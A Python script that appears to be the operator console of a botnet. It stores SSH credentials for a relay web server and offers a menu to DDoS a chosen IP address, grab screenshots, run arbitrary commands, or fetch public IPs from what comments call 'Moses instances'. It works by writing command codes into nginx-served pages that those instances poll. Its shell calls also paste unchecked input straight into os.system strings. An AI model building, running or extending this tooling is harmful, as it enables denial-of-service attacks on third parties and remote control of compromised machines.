import time, os
# TODO: define path to webpage folder on server as var definition
# TODO: encrypt username, ip address, and port when written to file
# TODO: implement kill command

# 1) Setup SSH keys with SSH server

def main():
    # reduce redundancy later (clear_page() calls...)
    if (not check_for_ssh_credentials()):
        print(":: saved SSH credentials not found")

        ssh_username = get_user_input("SSH username: ")
        ssh_ip_address = get_user_input("SSH server IP address: ")
        #can be defined as a str or int
        ssh_port = get_user_input("SSH server port: ")

        choice = get_user_input("Do you want to save SSH credentials? (Y/N) ")
        choice = choice.lower()

        if (choice == "y"):
            save_ssh_credentials(ssh_ip_address, ssh_port, ssh_username)
            print(":: SSH credentials saved")
        else:
            print(":: SSH credentials won't be saved")
    else:
        ssh_ip_address, ssh_port, ssh_username = load_ssh_credentials()
        choice = get_user_input("\nSSH username: " + ssh_username + "\nSSH server IP address: " + ssh_ip_address + "\nSSH server port: " + ssh_port + "\n\nDo you want to load these credentials? (Y/N) ")
        choice = choice.lower()

        if (choice == "y"):
            ssh_ip_address, ssh_port, ssh_username = load_ssh_credentials()
            print(":: loaded saved SSH credentials\n")
        else:
            ssh_username = get_user_input("SSH username: ")
            ssh_ip_address = get_user_input("SSH server IP address: ")
            #can be defined as a str or int
            ssh_port = get_user_input("SSH server port: ")

            choice = get_user_input("Do you want to save SSH credentials? (Y/N) ")
            choice = choice.lower()

            if (choice == "y"):
                save_ssh_credentials(ssh_ip_address, ssh_port, ssh_username)

    while (True):
        user_input = str(get_user_input("1) DDoS target web server\n2) Get screenshot\n3) Execute command\n4) Get public IP address\n5) Quit\n\nWhat do you want to do: "))

        if (user_input == "1"): #ddos_target_web_server()
            ddos_target = str(get_user_input("What IP address do you want to target? "))
            ddos_stop_time = str(get_user_input("What time do you want to stop the DDoS attack (24-HOUR FORMAT (EXAMPLE: 14:30))? "))

            send_command(1, 1, ssh_ip_address, ssh_port, ssh_username)
            send_command(2, ddos_target, ssh_ip_address, ssh_port, ssh_username)
            send_command(3, ddos_stop_time, ssh_ip_address, ssh_port, ssh_username)

            clear_pages(ssh_ip_address, ssh_port, ssh_username)
            #send_command(ddos_target, ddos_stop_time, ssh_ip_address, ssh_port, ssh_username)
        elif (user_input == "2"): #take_screenshot()
            send_command(1, 2, ssh_ip_address, ssh_port, ssh_username)

            clear_pages(ssh_ip_address, ssh_port, ssh_username)
        elif (user_input == "3"): #execute_command()
            command = str(get_user_input("Insert the command you want to execute: "))

            send_command(1, 3, ssh_ip_address, ssh_port, ssh_username)
            send_command(2, command, ssh_ip_address, ssh_port, ssh_username)

            clear_pages(ssh_ip_address, ssh_port, ssh_username)
        elif (user_input == "4"): # get_pub_ip_address()
            send_command(1, 4, ssh_ip_address, ssh_port, ssh_username)

            clear_pages(ssh_ip_address, ssh_port, ssh_username)
        elif (user_input == "5"): # quit()
            quit()
        else:
            quit(":: not a valid module... exiting...")



## SYSTEM MODULES ##
def get_user_input(message):
    while (True):
        user_input = str(input(message))

        if (not user_input):
            print(":: not a valid entry")
        else:
            break
    return user_input

def save_ssh_credentials(ssh_ip_address, ssh_port, ssh_username):
    f = open("ssh_ip_address.txt", "w")
    f.write(ssh_ip_address)
    f.close()

    f = open("ssh_port.txt", "w")
    f.write(ssh_port)
    f.close()

    f = open("ssh_username.txt", "w")
    f.write(ssh_username)
    f.close()

def check_for_ssh_credentials():
    paths = ["ssh_ip_address.txt", "ssh_port.txt", "ssh_username.txt"]

    for path in paths:
        if (not os.path.isfile(path)):
            return False

    return True

def send_command(page_number, module, ssh_ip_address, ssh_port, ssh_username):
    os.system("ssh " + str(ssh_username) + "@" + str(ssh_ip_address) + " -p " + str(ssh_port) + " 'echo '" + str(module) + "' > /var/www/website/tar" + str(page_number) + ".html && systemctl restart nginx'")

def load_ssh_credentials():
    f = open("ssh_ip_address.txt", "r")
    ssh_ip_address = f.read()
    f.close()

    f = open("ssh_port.txt", "r")
    ssh_port = f.read()
    f.close()

    f = open("ssh_username.txt", "r")
    ssh_username = f.read()
    f.close()

    return ssh_ip_address, ssh_port, ssh_username



## COMMAND MODULES ##
#def ddos_target_web_server(ddos_target, ddos_stop_time, ssh_ip_address, ssh_port, ssh_username):
    #os.system("ssh " + ssh_username + "@" + ssh_ip_address + " -p " + ssh_port + " 'echo '2' > /var/www/website/tar1.html && echo '" + ddos_target + "' > /var/www/website/tar2.html && echo '" + ddos_stop_time + "' > /var/www/website/tar3.html && sudo -S systemctl restart nginx'")

#TODO: INCOMPLETE
def clear_pages(ssh_ip_address, ssh_port, ssh_username):
    print("\n\nRequest sent.\nWaiting 15 seconds to ensure all Moses instances catch up...\nPlease wait...\n\n")

    time.sleep(15)

    for x in range(1, 4):
        os.system("ssh " + ssh_username + "@" + ssh_ip_address + " -p " + ssh_port + " 'echo '' > /var/www/website/tar" + str(x) + ".html'")

    os.system("ssh " + ssh_username + "@" + ssh_ip_address + " -p " + ssh_port + " 'systemctl restart nginx'")

main()
